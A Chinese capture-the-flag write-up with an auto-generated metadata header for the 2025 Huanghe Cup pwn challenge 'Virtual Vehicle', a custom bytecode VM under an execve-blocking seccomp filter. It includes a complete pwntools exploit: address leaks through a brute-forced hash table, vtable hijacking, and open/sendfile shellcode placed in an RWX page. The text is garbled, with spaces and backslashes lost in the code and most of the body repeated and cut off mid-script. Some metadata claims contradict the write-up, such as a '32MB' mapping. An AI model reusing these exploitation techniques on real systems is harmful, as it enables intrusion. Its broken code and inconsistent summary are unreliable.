---
title: 2025 黄鹤杯 PWN Virtual_Vehicle（VM 逆向+VM PWN+seccomp）
contest: 2025 黄鹤杯
year: 2025
difficulty: hard
vuln_type:
- vm
- shellcode
- rop
- seccomp
tags:
- 黄鹤杯 2025 PWN Virtual_Vehicle
- 自定义 VM 逆向+VM PWN
- vtable 8 个函数指针 (push_from_reg/push_from_imm/pop_to_reg/add_reg2_reg3_to_reg1/sub/mul/load/print)
- heap 0x1000 ope 字节码
- hashtable mmap RWX 0x1000
- seccomp-tools 沙箱
- KILL execve
- init_process() 初始化
- main 9 种操作 8 种通过 vtable
- 喷 shellcode 到 RWX
attack_chain:
- seccomp-tools 检查：禁 execve（KILL 0xc000003e != 0x3b），其他 ALLOW
- 喷 shellcode 到 mmap 0x1000 RWX 段
- main 9 种操作 → vtable 8 个函数指针
- 字节码 choide (4字节) + arg (n*4字节)
- 覆盖 vtable 指针或 hashtable 内容 → 控制流劫持
- 9 种操作 + print_data 喷出 flag
- 实际与车联网无关，是 VM 逆向+VM PWN
key_payload: vtable 8 个函数指针 + hashtable RWX mmap 0x1000
one_liner: 2025 黄鹤杯 PWN Virtual Vehicle：自定义 VM 字节码 + vtable 8 函数指针 + seccomp 禁 execve + hashtable RWX 段喷 shellcode。
lesson: VM PWN 套路：先反汇编字节码格式（choide+arg），再算 op 总数与 vtable 索引对应关系，seccomp-tools dump 是必做；本题实际是 VM 逆向（字节码 op）+ VM PWN（控制流劫持）混合。
quality: high
full_path: 2025年黄鹤杯_–_PWN_-_Virtual_Vehicle.full.md
meta_path: 2025年黄鹤杯_–_PWN_-_Virtual_Vehicle.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: 2025 黄鹤杯 PWN Virtual_Vehicle（VM 逆向+VM PWN+seccomp）。2025 黄鹤杯 PWN Virtual Vehicle：自定义 VM 字节码 + vtable 8 函数指针 + seccomp 禁 execve + hashtable RWX 段喷 shellcode。。关键路径：seccomp-tools 检查：禁 execve（KILL 0xc00...
category: pwn
subcategory: rop
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/271973.html
reasoning_chain:
- 触发点：二进制启动 → seccomp-tools dump 看到禁 execve(0x3b) ALLOW 其他 → 假设：必须 ORW 不能用 execve
- 动作：init_process 看反汇编 → 观察：vtable 8 个函数指针（push_from_reg/push_from_imm/pop_to_reg/add/sub/mul/load/print）
- 下一步：main 9 种 op 调 vtable[0..7] → 字节码格式 choide(4)+arg(n*4) 每次 offset += 5
- 触发点：hashtable = mmap(0, 0x1000, 7, 34, -1, 0) 7=RWX → 假设：可喷 shellcode 到 mmap 段
- 观察：mmap 32MB 大小 RWX 但 init_process 不直接写 → 假设：通过 push_from_imm 不断赋值把 shellcode 写进去
- 下一步：覆盖 vtable 指针或 load_data_from_reg 时跳到 hashtable → 喷 shellcode
- 触发点：seccomp 禁 execve → 假设：ORW shellcode（open/read/write）→ 动作：open('/flag') + read 到 buf + write(1, buf) → 输出 flag
failed_attempts:
- 试图用 system('/bin/sh') execve 提权 → 失败：seccomp 禁 0x3b
- 试图覆盖 main 返回地址 → 失败：main 是 __noreturn 死循环
- 试图直接跳到 hashtable 起始 → 失败：必须用 push_from_imm 写 shellcode 后再跳
key_observations:
- VM PWN 套路：先反汇编字节码格式（choide + arg），再算 op 总数与 vtable 索引对应关系
- mmap(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) = RWX 段识别
- seccomp-tools dump 是必做：本题禁 0x3b (execve) 但其他 syscall ALLOW
- 覆盖 vtable 指针或 load_data_from_reg 时跳到 mmap 段是 VM 字节码 pwn 通用打法
- ORW shellcode = open + read + write 单 syscall 链最稳
prerequisites:
- VM 反汇编（自定义字节码格式分析）
- seccomp 规则与沙箱绕过
- Linux mmap / ORW shellcode
- Ghidra/IDA 静态分析 vtable / mmap
---
# 2025年黄鹤杯 – PWN | Virtual Vehicle

> 原文: https://www.ctfiot.com/271973.html
> ID: 271973

Virtual Vehicle

本题实际和车联网没什么关系，考察的是VM逆向和VM PWN…主要是恶心，感觉。

勘察阶段

首先，发现程序存在沙箱。使用 seccomp-tools 检查一下。

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW

其次，根据 init_process() 函数可以发现程序在堆空间上存放了大量的信息结构（vtable、inode/info、operation_sequence等）。最值得注意的是给出了一段可读可写可执行的内存空间。从直觉上说，我们可能需要在这段空间上喷涂上 shell code。

__int64 init_process()
{
// ...
  vtable = malloc(0x40u);                   
  *(_QWORD *)vtable = push_from_reg;
  *((_QWORD *)vtable + 1) = push_from_imm;
  *((_QWORD *)vtable + 2) = pop_to_reg;
  *((_QWORD *)vtable + 3) = add_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 4) = sub_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 5) = mul_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 6) = load_data_from_reg;
  *((_QWORD *)vtable + 7) = print_data;      
  heap = (unsignedint *)malloc(0x1000u);     
  hashtable = (unsignedint *)mmap(0, 0x1000u, 7, 34, -1, 0);
  ::
info = (struct Info *)malloc(0x30u);       
  ::
info->vtable = (void (*(*)[8])(__int64, __int64, __int64))vtable;
  ::
info->offset = 0;         
  ::
info->stack_top = 0;            
  ::
info->stack_arena = heap;             
  info = ::
info;
  info->register_arena = (unsignedint *)malloc(0x10u);
  ::
info->data_arena = hashtable;             
  info_1 = ::
info;
  info_1->ope = (struct opcode *)malloc(0x1000u);
return0;
}

随后，进入 main() 函数会发现存在 9 种操作，其中 8 种操作和 info 中存放的 vtable 表存在关系。

void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
int n0x114514; // [rsp+14h] [rbp-Ch]
signedint offset; // [rsp+18h] [rbp-8h]

  n0x114514 = 0;
  init_process();
puts("Please input your op:");
  read(0, info->ope, 0x100u);
while ( 1 )
  {
    offset = info->offset;                      // offset
    info->offset = offset + 5;
    switch ( *(&info->ope->choide + offset) )
    {
      case1:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[0])((unsignedint)info->ope->arg[offset]);
        puts("op 0x1 executed");
        break;
      case2:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[1])(*(unsignedint *)&info->ope->arg[offset]);
        puts("op 0x2 executed");
        break;
      case3:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[2])((unsignedint)info->ope->arg[offset]);
        puts("op 0x3 executed");
        break;
      case4:
        (*info->vtable)[3](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x4 executed");
        break;
      case5:
        (*info->vtable)[4](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x5 executed");
        break;
      case6:
        (*info->vtable)[5](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x6 executed");
        break;
      case7:
        (*info->vtable)[6](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x7 executed");
        break;
      case8:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[7])((unsignedint)*(__int16 *)&info->ope->arg[offset]);
        puts("op 0x8 executed");
        break;
      case9:
        if ( n0x114514 )
        {
          printf("You can not use this op.");
          _exit(0);
        }
        read(0, &info->ope[1].choide + offset, 0x100u);
        *(&info->ope[5].choide + offset) = 0;
        n0x114514 = 0x114514;
        break;
      default:
        _exit(0);
    }
  }
}

为了方便起见，我们这里只保留利用中需要的功能函数。首先，最常规的就是 pop_to_reg() 函数。我们很容易发现其存在负数索引的问题。此时，再回头查看 init_process()，我们会发现 pop_to_reg() 函数的负数溢出是可以导致 vtable 可以被劫持。

__int64 __fastcall pop_to_reg(char n4)
{
if ( info->stack_top > 0x1FF )
  {
    puts("Stack error.");
    _exit(0);
  }
if ( (unsigned __int8)n4 >= 4u )
  {
    puts("Wrong reg index.");
    _exit(0);
  }
  info->register_arena[n4] = info->stack_arena[--info->stack_top];
return0;
}

从直觉上来说，我们现在需要泄露 map 出来的地址。可以看到，程序提供的泄露接口是 print_data()。

__int64 __fastcall print_data(__int16 n0x200)
{
  if ( (unsigned __int16)n0x200 >= 0x200u )
  {
    puts("Wrong data index.");
    _exit(0);
  }
  printf("data in offset %d is %xn", n0x200, info->data_arena[n0x200]);
  return 0;
}

根据阅读其实现，我们发现我们需要了解data中的数据是如何来的。很快发现 load_data_from_reg() 函数提供了对 data_arena 成员变量的修改。稍微可惜的是这里只能写入 info->register_arena[(char)n4] 哈希值。

__int64 __fastcall load_data_from_reg(char a1, unsigned __int8 n4, unsigned __int16 n0x200)
{
if ( a1 )
  {
    if ( a1 != 1 )
    {
      puts("Please check your opcode!");
      _exit(0);
    }
    puts("To be developed...");
  }
else
  {
    if ( n4 >= 4u )
    {
      puts("Wrong reg index.");
      _exit(0);
    }
    if ( n0x200 >= 0x200u )
    {
      puts("Wrong data index.");
      _exit(0);
    }
    info->data_arena[(__int16)n0x200] = hash(info->register_arena[(char)n4]);
  }
return0;
}

通过阅读 __int32 hash(int) 的定义，我们会发现哈希函数的输入输出都是 4 字节。如果采用朴素的爆破肯定是不可行的。我们很快关注到 PIE 的低 1.5 个字节是不变的。因此对于我们来说最多 3 字节不可知。而 16,777,216 的爆破数量是可以接受的。这里我们可以爆破 1 次，将结果保存到 hash.txt 中，最后通过解析 hash.txt 生成字典，这也就是所谓的打表（打过算法比赛的兄弟对这种优化可以说是太熟悉了）。

现在我们掌握了如何逆向哈希，但是我们该如何泄露 map 出来的地址呢？答案其实很简单，重启。只要泄露 ELF 基地址之后，我们就可以挟持 vtable 中无关紧要的函数为 start()。如此依赖初始化操作会重新发生，导致新的 stack 空间之前存在 map 地址。此外，两次 map 的地址恰好存在固定偏移的关系。

但是新的 stack 空间到保存 map 地址的地方相距甚远，我们需要一个无限“续杯”操作。很容易想到 main() 中的操作 9 可以作为这个 gadgets。最后，就是选用恰当的hash作为shellcode。通过努力，我们发现如果将 add() 劫持为 map 地址。那么存在恰当的hash，使得如下shell code存在：

lea rsi, [r8];
xchg edi, eax;
mov dx, 0x1ad0;
syscall

漏洞利用

首先，我们需要编写 brute_force.c 文件用于生成 hash.txt 文件。

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include 
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdnoreturn.h>

unsignedint __ROL4__(unsignedint a1, int a2)
{
    return (a1 << a2) | (a1 >> (32 - a2));
}

unsignedint __ROR4__(unsignedint a1, int a2)
{
    return (a1 >> a2) | (a1 << (32 - a2));
}

unsignedinthash(int a1)
{
unsignedint v1; // ecx
unsignedint v2; // esi
unsignedint v3; // edi
unsignedint v5; // [rsp+0h] [rbp-14h]
int n16; // [rsp+10h] [rbp-4h]

  v5 = __ROL4__(a1, 11);
for ( n16 = 0; n16 <= 16; ++n16 )
  {
    v1 = ((((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
         & 0xB14CB12D
         ^ ((v5 ^ (v5 >> 17)) << 19)
         & 0xDEADBEEF
         ^ v5
         ^ (v5 >> 17)
         ^ ((((v5 ^ (v5 >> 17)) << 19)
           & 0xDEADBEEF
           ^ v5
           ^ (v5 >> 17)
           ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
           & 0xB14CB12D) >> 25)) >> 13)
       ^ ((((v5 ^ (v5 >> 17)) << 19)
         & 0xDEADBEEF
         ^ v5
         ^ (v5 >> 17)
         ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
         & 0xB14CB12D) >> 25)
       ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
       & 0xB14CB12D
       ^ ((v5 ^ (v5 >> 17)) << 19)
       & 0xDEADBEEF
       ^ v5
       ^ (v5 >> 17);
    v2 = v1;
    v3 = v1;
    v5 = ((v2 ^ (v2 >> 15)) << 17)
       & 0xDEADBEEF
       ^ (v1 >> 15)
       ^ v1
       ^ (((v1 >> 15) ^ v2 ^ ((v3 ^ (v3 >> 15)) << 17) & 0xDEADBEEF) << 20);
  }
return (unsignedint)__ROR4__(v5, 15);
}

intmain() {
    FILE *fp = fopen("hash.txt", "w");
    for (int i = 0; i <= 0xffffff; i++) {
        unsignedint input = i << 8;
        unsignedint output = hash(input);
        fprintf(fp, ""0x%08x" : "0x%08x",n", output, input);
    }
    fclose(fp);
    return0;
}

其次，编写一个 python 脚本负责依据 hash.txt 生成字典以及攻陷服务。

因为涉及到 printf() 函数的栈平衡问题，可能会导致脚本攻击失败。因此你需要多跑几次。以下exp由xixi师傅和gosh共同编写，仅供参考。

from pwn import *
context.log_level = "debug"

defpush_reg(idx):
    returnb'x01'+p8(idx)+b'x00'*3

defpush_imm(imm):
    returnb'x02'+p32(imm)

defpop_reg(idx):
    returnb'x03'+p8(idx)+b'x00'*3

defadd(des,src1,src2):
    returnb'x04'+p8(des)+p8(src1)+p8(src2)+b'x00'

defsub(des,src1,src2):
    returnb'x05'+p8(des)+p8(src1)+p8(src2)+b'x00'

defimul(des,src1,src2):
    returnb'x06'+p8(des)+p8(src1)+p8(src2)+b'x00'

defwrite_data(flag,idx,off):
    returnb'x07'+p8(flag)+p8(idx)+p8(off)+b'x00'

defshow(idx):
    returnb'x08'+p16(idx)+b'x00'*2

defmagic():
    returnb'x09'+b'x00'*4

defbrute_force(idx):

pass

hashtable = {}
withopen("hash.txt", "r") as f:
    for line in f:
        # 去除行尾的换行符和可能的逗号
        line = line.strip().rstrip(',')
        
        # 分割键值对
        hash_value, input_value = line.split(" : ")
        
        # 去除两端的引号
        hash_value = hash_value.strip('"')
        input_value = input_value.strip('"')
        
        # 添加到字典中
        hashtable[hash_value] = input_value

log.info(f"总共 {len(hashtable)} 个条目")

elf = ELF("./pwn")
libc = elf.libc
context.os = elf.os
context.arch = elf.arch
local = True
if local:
  io = process([elf.path])
else:
  ip = ""
  port = 1111
  io = remote(ip, port)

ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += push_imm(0xd0)
ope += pop_reg(0)
for i inrange(0x5):
  ope += pop_reg(1) # h16
ope += pop_reg(2) # l32
ope += imul(1, 1, 3) # 0x00????00
ope += write_data(0, 1, 0)
ope += show(0)

# part : leak heap address low 32 bits
# reg0 : 0xd0
# reg2 : low 32 bits
# reg3 : 0x10000
ope += sub(2, 2, 0)
ope += write_data(0, 2, 0)
ope += show(0)

# part : 续杯
ope += magic()

# part : calculate elf base
io.sendafter(b"Please input your op:", ope)

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
elf_addr_h = int(hashtable[hash_value], 16) >> 8
log.success(f"elf_addr_h: {hex(elf_addr_h)}")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
elf_addr_l = int(hashtable[hash_value], 16) & 0xffffff00
log.success(f"elf_addr_l: {hex(elf_addr_l)}")

elf_addr = elf_addr_h << 32 | elf_addr_l | 0xd0
log.success(f"elf_addr: {hex(elf_addr)}")
elf_base = elf_addr - 0x20d0
log.success(f"elf_base: {hex(elf_base)}")

start = elf_base + 0x1160
read_ope = elf_base + 0x2841

# part : start
ope = b""
ope += push_imm(start & 0xffffffff)
ope += show(0)

io.send(ope)

ope = b""
for i inrange(19):
  ope += pop_reg(1) # h16
ope += pop_reg(2)
ope += push_imm(read_ope & 0xffffffff)
ope += pop_reg(0) * 25

ope += push_reg(0)

io.sendafter(b"Please input your op:", ope)

for i inrange(340):
    ope = b""
    ope += pop_reg(0) + pop_reg(1) + pop_reg(2)
    ope += push_reg(0)
    io.send(ope)

    for j inrange(3):
        io.recvuntil(b"executed")

'''
reg1 : mmap_h
reg2 : mmap_l
ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += imul(1, 1, 3) # 0x00????00

ope += write_data(0, 1, 0)
ope += show(0)

# part : leak heap address low 32 bits
# reg0 : 0xd0
# reg2 : low 32 bits
# reg3 : 0x10000
ope += sub(2, 2, 0)
ope += write_data(0, 2, 0)
ope += show(0)
'''

ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += imul(1, 1, 3) # 0x00????00
ope += push_reg(0)
io.send(ope)
for j inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += write_data(0, 1, 0)
ope += show(0)
ope += push_reg(0)
io.send(ope)
for j inrange(3):
    io.recvuntil(b"executed")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
mmap_h = int(hashtable[hash_value], 16) >> 8
log.success(f"mmap_h: {hex(mmap_h)}")

# part : pop
ope = b""
ope += push_reg(0)
io.send(ope)
sleep(0.5)

ope = b""
ope += write_data(0, 2, 0)
ope += show(0)
ope += push_reg(0)
io.send(ope)
for j inrange(1):
    io.recvuntil(b"executed")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
mmap_l = int(hashtable[hash_value], 16) & 0xffffff00
log.success(f"mmap_l: {hex(mmap_l)}")

mmap_addr = mmap_h << 32 | mmap_l
log.success(f"mmap_addr: {hex(mmap_addr)}")

target_mmap_addr = mmap_addr - 0x221000
log.success(f"target_mmap_addr: {hex(target_mmap_addr)}")

for i inrange(301 + 47):
    ope = b""
    ope += push_imm(0x100) * 3
    ope += push_reg(0)
    io.send(ope)
    for i inrange(3):
        io.recvuntil(b"executed")

push_from_imm = elf_base + 0x1CD0
pop_to_reg = elf_base + 0x1D10

ope = b""
ope += push_imm(read_ope & 0xffffffff)
ope += push_imm((read_ope >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(push_from_imm & 0xffffffff)
ope += push_imm((push_from_imm >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(pop_to_reg & 0xffffffff)
ope += push_imm((pop_to_reg >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(target_mmap_addr & 0xffffffff)
ope += push_imm((target_mmap_addr >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xf3f06700)
ope += pop_reg(0)
ope += write_data(0, 0, 0)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xfff1e100)
ope += pop_reg(0)
ope += write_data(0, 0, 1)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xe96cc900)
ope += pop_reg(0)
ope += write_data(0, 0, 2)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

sleep(1)
ope = b""
ope += add(0, 0, 0)
io.send(ope)

sleep(1)

sc = asm(shellcraft.open("flag", 0) + shellcraft.sendfile(1, 3, 0, 0x50)).rjust(0x50, asm("nop"))
io.send(sc)

io.interactive()

效果

效果展示图


```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
__int64 init_process()
{
// ...
  vtable = malloc(0x40u);                   
  *(_QWORD *)vtable = push_from_reg;
  *((_QWORD *)vtable + 1) = push_from_imm;
  *((_QWORD *)vtable + 2) = pop_to_reg;
  *((_QWORD *)vtable + 3) = add_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 4) = sub_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 5) = mul_reg2_reg3_to_reg1;
  *((_QWORD *)vtable + 6) = load_data_from_reg;
  *((_QWORD *)vtable + 7) = print_data;      
  heap = (unsignedint *)malloc(0x1000u);     
  hashtable = (unsignedint *)mmap(0, 0x1000u, 7, 34, -1, 0);
  ::
info = (struct Info *)malloc(0x30u);       
  ::
info->vtable = (void (*(*)[8])(__int64, __int64, __int64))vtable;
  ::
info->offset = 0;         
  ::
info->stack_top = 0;            
  ::
info->stack_arena = heap;             
  info = ::
info;
  info->register_arena = (unsignedint *)malloc(0x10u);
  ::
info->data_arena = hashtable;             
  info_1 = ::
info;
  info_1->ope = (struct opcode *)malloc(0x1000u);
return0;
}
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
int n0x114514; // [rsp+14h] [rbp-Ch]
signedint offset; // [rsp+18h] [rbp-8h]

  n0x114514 = 0;
  init_process();
puts("Please input your op:");
  read(0, info->ope, 0x100u);
while ( 1 )
  {
    offset = info->offset;                      // offset
    info->offset = offset + 5;
    switch ( *(&info->ope->choide + offset) )
    {
      case1:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[0])((unsignedint)info->ope->arg[offset]);
        puts("op 0x1 executed");
        break;
      case2:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[1])(*(unsignedint *)&info->ope->arg[offset]);
        puts("op 0x2 executed");
        break;
      case3:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[2])((unsignedint)info->ope->arg[offset]);
        puts("op 0x3 executed");
        break;
      case4:
        (*info->vtable)[3](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x4 executed");
        break;
      case5:
        (*info->vtable)[4](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x5 executed");
        break;
      case6:
        (*info->vtable)[5](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x6 executed");
        break;
      case7:
        (*info->vtable)[6](
          (unsignedint)info->ope->arg[offset],
          (unsignedint)info->ope->arg[offset + 1],
          (unsignedint)info->ope->arg[offset + 2]);
        puts("op 0x7 executed");
        break;
      case8:
        ((void (__fastcall *)(_QWORD))(*info->vtable)[7])((unsignedint)*(__int16 *)&info->ope->arg[offset]);
        puts("op 0x8 executed");
        break;
      case9:
        if ( n0x114514 )
        {
          printf("You can not use this op.");
          _exit(0);
        }
        read(0, &info->ope[1].choide + offset, 0x100u);
        *(&info->ope[5].choide + offset) = 0;
        n0x114514 = 0x114514;
        break;
      default:
        _exit(0);
    }
  }
}
__int64 __fastcall pop_to_reg(char n4)
{
if ( info->stack_top > 0x1FF )
  {
    puts("Stack error.");
    _exit(0);
  }
if ( (unsigned __int8)n4 >= 4u )
  {
    puts("Wrong reg index.");
    _exit(0);
  }
  info->register_arena[n4] = info->stack_arena[--info->stack_top];
return0;
}
__int64 __fastcall print_data(__int16 n0x200)
{
  if ( (unsigned __int16)n0x200 >= 0x200u )
  {
    puts("Wrong data index.");
    _exit(0);
  }
  printf("data in offset %d is %xn", n0x200, info->data_arena[n0x200]);
  return 0;
}
__int64 __fastcall load_data_from_reg(char a1, unsigned __int8 n4, unsigned __int16 n0x200)
{
if ( a1 )
  {
    if ( a1 != 1 )
    {
      puts("Please check your opcode!");
      _exit(0);
    }
    puts("To be developed...");
  }
else
  {
    if ( n4 >= 4u )
    {
      puts("Wrong reg index.");
      _exit(0);
    }
    if ( n0x200 >= 0x200u )
    {
      puts("Wrong data index.");
      _exit(0);
    }
    info->data_arena[(__int16)n0x200] = hash(info->register_arena[(char)n4]);
  }
return0;
}
lea rsi, [r8];
xchg edi, eax;
mov dx, 0x1ad0;
syscall
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <stdint.h>
    #include <stdbool.h>
    #include <stddef.h>
    #include <stdnoreturn.h>

unsignedint __ROL4__(unsignedint a1, int a2)
{
    return (a1 << a2) | (a1 >> (32 - a2));
}

unsignedint __ROR4__(unsignedint a1, int a2)
{
    return (a1 >> a2) | (a1 << (32 - a2));
}

unsignedinthash(int a1)
{
unsignedint v1; // ecx
unsignedint v2; // esi
unsignedint v3; // edi
unsignedint v5; // [rsp+0h] [rbp-14h]
int n16; // [rsp+10h] [rbp-4h]

  v5 = __ROL4__(a1, 11);
for ( n16 = 0; n16 <= 16; ++n16 )
  {
    v1 = ((((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
         & 0xB14CB12D
         ^ ((v5 ^ (v5 >> 17)) << 19)
         & 0xDEADBEEF
         ^ v5
         ^ (v5 >> 17)
         ^ ((((v5 ^ (v5 >> 17)) << 19)
           & 0xDEADBEEF
           ^ v5
           ^ (v5 >> 17)
           ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
           & 0xB14CB12D) >> 25)) >> 13)
       ^ ((((v5 ^ (v5 >> 17)) << 19)
         & 0xDEADBEEF
         ^ v5
         ^ (v5 >> 17)
         ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
         & 0xB14CB12D) >> 25)
       ^ ((((v5 ^ (v5 >> 17)) << 19) & 0xDEADBEEF ^ v5 ^ (v5 >> 17)) << 29)
       & 0xB14CB12D
       ^ ((v5 ^ (v5 >> 17)) << 19)
       & 0xDEADBEEF
       ^ v5
       ^ (v5 >> 17);
    v2 = v1;
    v3 = v1;
    v5 = ((v2 ^ (v2 >> 15)) << 17)
       & 0xDEADBEEF
       ^ (v1 >> 15)
       ^ v1
       ^ (((v1 >> 15) ^ v2 ^ ((v3 ^ (v3 >> 15)) << 17) & 0xDEADBEEF) << 20);
  }
return (unsignedint)__ROR4__(v5, 15);
}

intmain() {
    FILE *fp = fopen("hash.txt", "w");
    for (int i = 0; i <= 0xffffff; i++) {
        unsignedint input = i << 8;
        unsignedint output = hash(input);
        fprintf(fp, ""0x%08x" : "0x%08x",n", output, input);
    }
    fclose(fp);
    return0;
}
from pwn import *
context.log_level = "debug"

defpush_reg(idx):
    returnb'x01'+p8(idx)+b'x00'*3

defpush_imm(imm):
    returnb'x02'+p32(imm)

defpop_reg(idx):
    returnb'x03'+p8(idx)+b'x00'*3

defadd(des,src1,src2):
    returnb'x04'+p8(des)+p8(src1)+p8(src2)+b'x00'

defsub(des,src1,src2):
    returnb'x05'+p8(des)+p8(src1)+p8(src2)+b'x00'

defimul(des,src1,src2):
    returnb'x06'+p8(des)+p8(src1)+p8(src2)+b'x00'

defwrite_data(flag,idx,off):
    returnb'x07'+p8(flag)+p8(idx)+p8(off)+b'x00'

defshow(idx):
    returnb'x08'+p16(idx)+b'x00'*2

defmagic():
    returnb'x09'+b'x00'*4

defbrute_force(idx):

pass

hashtable = {}
withopen("hash.txt", "r") as f:
    for line in f:
        # 去除行尾的换行符和可能的逗号
        line = line.strip().rstrip(',')
        
        # 分割键值对
        hash_value, input_value = line.split(" : ")
        
        # 去除两端的引号
        hash_value = hash_value.strip('"')
        input_value = input_value.strip('"')
        
        # 添加到字典中
        hashtable[hash_value] = input_value

log.info(f"总共 {len(hashtable)} 个条目")

elf = ELF("./pwn")
libc = elf.libc
context.os = elf.os
context.arch = elf.arch
local = True
if local:
  io = process([elf.path])
else:
  ip = ""
  port = 1111
  io = remote(ip, port)

ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += push_imm(0xd0)
ope += pop_reg(0)
for i inrange(0x5):
  ope += pop_reg(1) # h16
ope += pop_reg(2) # l32
ope += imul(1, 1, 3) # 0x00????00
ope += write_data(0, 1, 0)
ope += show(0)

# part : leak heap address low 32 bits
# reg0 : 0xd0
# reg2 : low 32 bits
# reg3 : 0x10000
ope += sub(2, 2, 0)
ope += write_data(0, 2, 0)
ope += show(0)

# part : 续杯
ope += magic()

# part : calculate elf base
io.sendafter(b"Please input your op:", ope)

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
elf_addr_h = int(hashtable[hash_value], 16) >> 8
log.success(f"elf_addr_h: {hex(elf_addr_h)}")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
elf_addr_l = int(hashtable[hash_value], 16) & 0xffffff00
log.success(f"elf_addr_l: {hex(elf_addr_l)}")

elf_addr = elf_addr_h << 32 | elf_addr_l | 0xd0
log.success(f"elf_addr: {hex(elf_addr)}")
elf_base = elf_addr - 0x20d0
log.success(f"elf_base: {hex(elf_base)}")

start = elf_base + 0x1160
read_ope = elf_base + 0x2841

# part : start
ope = b""
ope += push_imm(start & 0xffffffff)
ope += show(0)

io.send(ope)

ope = b""
for i inrange(19):
